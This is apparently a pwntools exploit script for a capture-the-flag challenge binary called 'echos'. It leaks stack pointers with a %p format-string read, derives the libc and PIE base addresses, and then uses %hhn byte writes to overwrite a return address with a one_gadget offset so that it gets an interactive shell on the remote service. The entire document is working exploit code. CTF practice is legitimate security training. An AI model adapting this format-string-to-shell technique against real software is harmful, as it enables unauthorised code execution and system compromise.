from pwn import *
context.update(arch='amd64', os='linux')
context.terminal = ['iterm2', 'new-window']

HOST, PORT = 'chal.duc.tf', 30001
BINARY = './echos'
LIBC = './libc6_2.27-3ubuntu1_amd64.so'

elf  = ELF(BINARY)
libc = ELF(LIBC,checksec=False)

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = remote('127.0.0.1',9997)


p.sendline('AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
a = p.recv().split('.')

libc.address = int(a[-2],16)-(libc.symbols['__libc_start_main']+231)
pie_base = int(a[-3],16) - elf.symbols['__libc_csu_init']
ret = int(a[1],16) + 0x58
info("libc address %s",hex(libc.address))
info("pie_base %s",hex(pie_base))
info("ret %s",hex(ret))

binsh = next(libc.search("/bin/sh"))

system = libc.sym["system"]
system = libc.address + 0x4f4e0
info("__libc_start_main+231 %s", a[-2] )
info("system %s",hex(system))


one_gadget= 0x4f2c5 #rsp & 0xf == 0
one_gadget = 0x4f322 #  [rsp+0x40] == NULL
one_gadget = 0x10a38c # [rsp+0x70] == NULL

shell = libc.address + one_gadget
offset = 8


writes={}
for i in range(3):
	writes[ret + i ] = (shell >> (8*i)) &0xff
print(writes)

payload = ''
offset = 8 + 40 // 8
n = 0
for (i, addr) in enumerate(writes):
    l = (writes[addr] - n - 1) % 256 + 1
    payload += '%{}c%{}$hhn'.format(l, offset + i)
    n += l
payload += 'A' * (40 - len(payload))
assert len(payload) == (offset - 8) * 8

for addr in writes:
    payload += p64(addr)
assert len(payload) <= 0x40



print(payload,1)

pause()
p.sendline(payload)
print(p.recv(),1)
p.sendline(payload)


p.interactive()